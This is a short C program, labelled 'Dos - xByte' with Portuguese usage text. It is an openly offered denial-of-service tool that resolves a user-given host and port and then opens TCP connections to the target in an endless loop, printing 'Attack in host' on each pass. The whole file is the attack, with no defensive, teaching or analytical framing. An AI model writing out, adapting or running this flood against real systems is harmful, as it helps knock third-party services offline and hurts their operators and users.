#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>

int main(int argc, char *args[]){

	int sockett;
	int conecta;
	

	if(args[1] == 0 || args[2] == 0){
		printf("Dos - xByte\n");
		printf("Modo uso: %s  www.teste.com 21\n",args[0] );
	}else{
	struct hostent *url = gethostbyname(args[1]);
	int porta = atoi(args[2]);
	char tra[INET_ADDRSTRLEN];
	inet_ntop(AF_INET, url->h_addr, tra, sizeof(tra));
	printf(tra);

	struct sockaddr_in alvo;
		while(1){
		sockett = socket(AF_INET, SOCK_STREAM,0);
		alvo.sin_family = AF_INET;
		alvo.sin_port = htons(porta);
		alvo.sin_addr.s_addr = inet_addr(tra);
		conecta = connect(sockett,(struct sockaddr *)&alvo, sizeof alvo);
		printf("Attack in host %s port %i \n " , tra, porta);
		}
	return 0;	
	}
}
